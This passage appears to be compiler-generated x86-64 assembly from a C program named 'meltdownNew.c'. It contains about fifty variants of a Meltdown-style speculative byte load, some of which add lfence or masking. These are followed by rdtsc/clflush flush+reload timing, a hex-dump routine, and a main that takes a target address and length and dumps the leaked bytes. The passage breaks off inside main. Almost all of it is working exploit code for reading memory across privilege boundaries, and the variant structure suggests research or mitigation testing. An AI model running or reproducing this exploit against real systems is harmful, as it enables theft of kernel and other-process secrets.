	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	nop
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 75
.Lprobe_one_win0_var75:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 76
.Lprobe_one_win0_var76:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 77
.Lprobe_one_win0_var77:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 78
.Lprobe_one_win0_var78:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 79
.Lprobe_one_win0_var79:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 80
.Lprobe_one_win0_var80:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 81
.Lprobe_one_win0_var81:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 82
.Lprobe_one_win0_var82:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 83
.Lprobe_one_win0_var83:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 84
.Lprobe_one_win0_var84:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 85
.Lprobe_one_win0_var85:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 86
.Lprobe_one_win0_var86:
	popq	%rax
	addq	$32, %rsp
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 87
.Lprobe_one_win0_var87:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 88
.Lprobe_one_win0_var88:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 89
.Lprobe_one_win0_var89:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 90
.Lprobe_one_win0_var90:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	nop
	movb	(%r10), %al
	lfence
	shlq	$0xc, %rax
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 91
.Lprobe_one_win0_var91:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	nop
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 92
.Lprobe_one_win0_var92:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 93
.Lprobe_one_win0_var93:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	nop
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 94
.Lprobe_one_win0_var94:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	nop
	nop
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 95
.Lprobe_one_win0_var95:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 96
.Lprobe_one_win0_var96:
	popq	%rax
	addq	$32, %rsp
	leaq	(%rdx), %r10
	movb	(%r10), %al
	lfence
	lfence
	lfence
	lfence
	shlq	$0xc, %rax
	jz	92b
	nop
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 97
.Lprobe_one_win0_var97:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	nop
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 98
.Lprobe_one_win0_var98:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	nop
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 99
.Lprobe_one_win0_var99:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	leaq	(%rdx), %r10
	movb	(%r10), %al
	nop
	lfence
	shlq	$0xc, %rax
	nop
	jz	92b
	lfence
	leaq	(%rcx, %rax, 1), %r10
	movq	(%r10), %rbx
	jmp	.Lprobe_one_win0_continue
.Lprobe_one_win0_continue:
__speculative_byte_load_exit:
	nop
# 0 "" 2
#NO_APP
	movl	$0, -2388(%rbp)
	jmp	.L6
.L8:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2344(%rbp)
	movq	-2344(%rbp), %rax
	movq	%rax, %rcx
#APP
# 118 "meltdownNew.c" 1
	mfence
	lfence
	rdtsc
	lfence
	movl	%eax, %esi
	movl	(%rcx), %eax
	lfence
	rdtsc
	subl	%esi, %eax
	clflush	0(%rcx)
# 0 "" 2
#NO_APP
	movq	%rax, -2368(%rbp)
	movq	-2368(%rbp), %rdx
	movl	-2388(%rbp), %eax
	cltq
	movq	%rdx, -2336(%rbp,%rax,8)
	addl	$1, -2388(%rbp)
.L6:
	cmpl	$255, -2388(%rbp)
	jle	.L8
	movl	$0, -2388(%rbp)
	jmp	.L9
.L12:
	movl	-2384(%rbp), %eax
	cltq
	movq	-2336(%rbp,%rax,8), %rax
	movl	-2388(%rbp), %edx
	movslq	%edx, %rdx
	movq	-2336(%rbp,%rdx,8), %rdx
	cmpq	%rax, %rdx
	jnb	.L10
	movl	-2388(%rbp), %eax
	jmp	.L11
.L10:
	movl	-2384(%rbp), %eax
.L11:
	movl	%eax, -2384(%rbp)
	addl	$1, -2388(%rbp)
.L9:
	cmpl	$255, -2388(%rbp)
	jle	.L12
	movl	-2384(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	leal	1(%rax), %edx
	movl	-2384(%rbp), %eax
	cltq
	movb	%dl, -288(%rbp,%rax)
	addl	$1, -2392(%rbp)
.L3:
	movl	-2392(%rbp), %eax
	cmpl	-2376(%rbp), %eax
	jl	.L13
	movl	$0, -2388(%rbp)
	jmp	.L14
.L17:
	movl	-2388(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %edx
	movl	-2380(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	cmpb	%dl, %al
	jnb	.L15
	movl	-2388(%rbp), %eax
	jmp	.L16
.L15:
	movl	-2380(%rbp), %eax
.L16:
	movl	%eax, -2380(%rbp)
	addl	$1, -2388(%rbp)
.L14:
	cmpl	$255, -2388(%rbp)
	jle	.L17
	movl	-2380(%rbp), %eax
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	probe_one, .-probe_one
	.section	.rodata
.LC0:
	.string	"0x%016lx | "
.LC1:
	.string	"%02X "
.LC2:
	.string	"|  %s \n"
.LC3:
	.string	"   "
	.text
	.globl	dump_hex
	.type	dump_hex, @function
dump_hex:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movb	$0, -16(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -48(%rbp)
	jmp	.L21
.L30:
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$31, %al
	jbe	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$126, %al
	ja	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %edx
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	%dl, -32(%rbp,%rax)
	jmp	.L23
.L22:
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	$46, -32(%rbp,%rax)
.L23:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$7, %eax
	testq	%rax, %rax
	je	.L24
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
.L24:
	movl	$32, %edi
	call	putchar@PLT
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L26
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L25
.L26:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movb	$0, -32(%rbp,%rax)
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	cmpq	$8, %rax
	ja	.L27
	movl	$32, %edi
	call	putchar@PLT
.L27:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movq	%rax, -40(%rbp)
	jmp	.L28
.L29:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addq	$1, -40(%rbp)
.L28:
	cmpq	$15, -40(%rbp)
	jbe	.L29
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L25:
	addq	$1, -48(%rbp)
.L21:
	movq	-48(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jb	.L30
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	dump_hex, .-dump_hex
	.section	.rodata
	.align 8
.LC4:
	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
.LC5:
	.string	"mmap() failed: %s\n"
	.align 8
.LC6:
	.string	"poke buffer: %p, page size: %i\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$264, %rsp
	.cfi_offset 3, -24
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	call	getpagesize@PLT
	movl	%eax, -244(%rbp)
	movl	$0, -248(%rbp)
	movq	$0, -232(%rbp)
	movq	$0, -224(%rbp)
	leaq	-208(%rbp), %rax
	movl	$152, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	leaq	-208(%rbp), %rax
	addq	$8, %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	leaq	sigaction_segv(%rip), %rax
	movq	%rax, -208(%rbp)
	movl	$4, -72(%rbp)
	leaq	-208(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$11, %edi
	call	sigaction@PLT
	cmpl	$2, -260(%rbp)
	jle	.L33
	cmpl	$4, -260(%rbp)
	jle	.L34
.L33:
	movq	-272(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L47
.L34:
	movq	-272(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$16, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -232(%rbp)
	movq	-272(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	movl	$10, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -224(%rbp)
	cmpl	$4, -260(%rbp)
	jne	.L36
	movl	$1, -248(%rbp)
.L36:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	cltq
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$33, %ecx
	movl	$3, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -216(%rbp)
	cmpq	$-1, -216(%rbp)
	jne	.L37
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L47
.L37:
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -240(%rbp)
	jmp	.L38
.L41:
	cmpl	$0, -248(%rbp)
	jne	.L39
	cmpq	$0, -240(%rbp)
	je	.L39
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L39
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	addq	%rdx, %rax
	subq	$16, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movl	$16, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L39:
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rbx
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	probe_one
	movb	%al, -48(%rbp,%rbx)
	cmpl	$0, -248(%rbp)
	je	.L40
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	leaq	-48(%rbp), %rax
	addq	%rdx, %rax
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	write@PLT
.L40:
	addq	$1, -240(%rbp)
.L38:
	movq	-240(%rbp), %rax
	cmpq	-224(%rbp), %rax
	jb	.L41
	cmpl	$0, -248(%rbp)
	jne	.L42
	cmpq	$0, -240(%rbp)
	je	.L42
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	je	.L43
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	jmp	.L44
.L43:
	movl	$16, %edx
.L44:
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L45
	movq	-240(%rbp), %rax
	subq	$1, %rax
	andq	$-16, %rax
	jmp	.L46
.L45:
	movq	-240(%rbp), %rax
	andq	$-16, %rax
.L46:
	movq	-232(%rbp), %rcx
	addq	%rcx, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L42:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	movslq	%eax, %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	munmap@PLT
	movl	$0, %eax
.L47:
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L48
